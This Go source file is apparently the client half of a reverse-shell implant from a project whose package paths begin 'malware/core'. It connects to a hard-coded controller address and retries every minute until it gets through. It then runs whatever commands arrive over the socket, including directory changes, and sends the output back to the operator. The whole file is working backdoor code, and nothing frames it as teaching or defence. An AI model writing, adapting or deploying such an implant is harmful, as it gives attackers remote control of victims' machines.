package main

//Client

import (
	"bufio"
	"fmt"
	network "malware/core/Network"
	platforms "malware/core/Platforms"
	utils "malware/core/Utils"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	var conn net.Conn

	IP := "127.0.0.1"
	Port := "9090"
begin:
	conn, err := network.ConnectionWithServer(IP, Port)
	if err != nil {
		time.Sleep(time.Minute * 1)
		goto begin
	}

	defer conn.Close()

	var userInput string
	resCmd := platforms.Run("pwd")
	utils.Encode(conn, resCmd)
	for {
		reader := bufio.NewReader(conn)
		userInput, err = reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		strCommand := strings.TrimSuffix(userInput, "\n")
		args := strings.Split(strCommand, " ")

		if args[0] == "cd" {
			if args[1] == "" {
				args[1] = "/"
			}
			os.Chdir(args[1])
			args[0] = "pwd"
		}
		resCmd := platforms.Run(args[0], args[1:]...)

		utils.Encode(conn, resCmd)
	}
}
